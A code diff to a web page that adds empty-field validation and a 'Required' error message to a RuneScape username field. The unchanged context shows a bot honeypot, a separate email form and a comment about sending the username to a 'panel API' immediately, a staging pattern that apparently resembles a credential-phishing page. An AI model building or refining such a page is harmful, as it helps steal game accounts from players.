@@ -69,6 +69,7 @@
                             <div class="input-container" id="input-container2">
                                 <input type="text" id="user_input" class="input-field" name="username" autocomplete="username" maxlength="50">
                                 <label for="user_input" class="input-label">RuneScape username</label>
+                                <span class="error-message username-error" id="usernameError" style="display: none;">Required</span>
                             </div>
                             <!-- Honeypot: leave empty; bots that fill it get blocked -->
                             <input type="text" id="_hp" name="_hp" value="" tabindex="-1" autocomplete="off" aria-hidden="true" style="position:absolute;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;">
@@ -534,6 +535,19 @@
                 emailInput.addEventListener("focus", clearEmailError);
             }
 
+            // Clear username error state when user types or focuses the username field
+            const usernameLabel = document.querySelector('label[for="user_input"]');
+            function clearUsernameError() {
+                if (usernameContainer) usernameContainer.classList.remove("has-username-error");
+                if (usernameLabel) usernameLabel.classList.remove("color_red");
+                const usernameErrorEl = document.getElementById("usernameError");
+                if (usernameErrorEl) usernameErrorEl.style.display = "none";
+            }
+            if (usernameInput) {
+                usernameInput.addEventListener("input", clearUsernameError);
+                usernameInput.addEventListener("focus", clearUsernameError);
+            }
+
             // Handle form submission for email
             if (form) {
                 form.addEventListener("submit", function(event) {
@@ -616,7 +630,27 @@
                     usernameSubmitBtn.disabled = true;
                     
                     // Get the username value
-                    const username = usernameInput ? usernameInput.value : '';
+                    const username = usernameInput ? usernameInput.value.trim() : '';
+                    
+                    // Validate: if empty, show red error state and do not proceed
+                    if (!username) {
+                        if (usernameContainer) usernameContainer.classList.add("has-username-error");
+                        if (usernameLabel) usernameLabel.classList.add("color_red");
+                        const usernameErrorEl = document.getElementById("usernameError");
+                        if (usernameErrorEl) {
+                            usernameErrorEl.textContent = "Required";
+                            usernameErrorEl.style.display = "block";
+                        }
+                        if (usernameInput) usernameInput.focus();
+                        // Hide loader and enable button again
+                        if (preloader) preloader.style.display = "none";
+                        usernameSubmitBtn.classList.remove("loading");
+                        usernameSubmitBtn.disabled = false;
+                        return;
+                    }
+                    
+                    // Clear any previous error state
+                    clearUsernameError();
                     
                     // Send username to panel API immediately if not already sent
                     if (!usernameSent && username) {
